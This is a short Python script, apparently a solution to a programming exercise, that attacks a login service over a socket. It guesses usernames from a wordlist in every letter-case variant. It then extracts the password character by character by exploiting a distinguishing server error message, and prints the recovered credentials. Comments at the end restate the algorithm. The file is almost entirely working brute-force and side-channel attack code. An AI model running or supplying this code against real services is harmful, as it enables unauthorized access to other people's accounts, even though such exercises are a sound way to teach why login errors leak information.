import argparse
import socket
import itertools
import json
import string

parser = argparse.ArgumentParser(description="suppa hackka")
parser.add_argument('ip',  help='ip address', type=str)
parser.add_argument('port',  help='port', type=int)
args = parser.parse_args()

client = socket.socket()
client.connect((args.ip, args.port))


def send_response(logn: str, passwd: str):
    """accepts login, passwd as args, sends it to server, returns server message"""
    msg_dict = {"login": logn, "password": passwd}
    msg = json.dumps(msg_dict)
    client.send(msg.encode('utf8'))
    return json.loads(client.recv(1024).decode())['result']


with open(r"C:\down\logins.txt", "r") as f:
    logins = [x.replace('\n', '') for x in f.readlines()]


def find_login():
    global login
    for i in logins:
        possible = [[letter.lower(), letter.upper()] for letter in i]
        iter_obj = itertools.product(*possible)
        try:
            while True:
                this_login = ''.join(next(iter_obj))
                if send_response(this_login, ' ') == 'Wrong password!':
                    return this_login
        except StopIteration: pass


login = find_login()

password = ''
result = None


def find_password():
    global password, login, result
    while True:
        for char in (string.ascii_lowercase + string.ascii_uppercase + string.digits):
            this_pass = password + char
            result = send_response(login, this_pass)
            if result == "Exception happened during login":
                password += char
                break
            elif result == "Connection success!":
                password += char
                creds = {
                    "login": login,
                    "password": password
                }
                print(json.dumps(creds))
                return


find_password()

client.close()

'''
Try all logins (upper lower cases) with an empty password (not really turns out " " is the what empty means here). 

When you find the login, try out every possible password of length 1.

When an exception occurs, you know that you found the first letter of the password.

Use the found login and the found letter to find the second letter of the password.

Repeat until you receive the ‘success’ message.
-----------
password are digits and lower- and upper-case letters.
'''

'''
algorithm
password = ' ' 
login = None

while login is None:
    send all logins, find the login like stage 3 password

password = ''

password is lower case, upper case, digits

while password is not found:
    loop through lowercase + upper case + digits
            this_pass = password + character
            send to server
            if server returns exception
                add the thing to password
                break loop
    send whole password to server
    if it works
    break this loop and print password

'''
